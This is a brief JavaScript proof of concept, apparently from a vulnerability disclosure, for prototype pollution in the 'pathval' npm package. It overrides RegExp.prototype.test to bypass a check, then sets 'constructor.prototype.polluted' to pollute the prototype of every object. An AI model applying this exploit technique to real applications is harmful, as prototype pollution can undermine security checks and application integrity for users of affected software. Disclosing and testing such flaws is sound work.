RegExp.prototype.test = () => true;
var pathval = require('pathval');
var obj = {};
console.log({}.polluted);
pathval.setPathValue(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);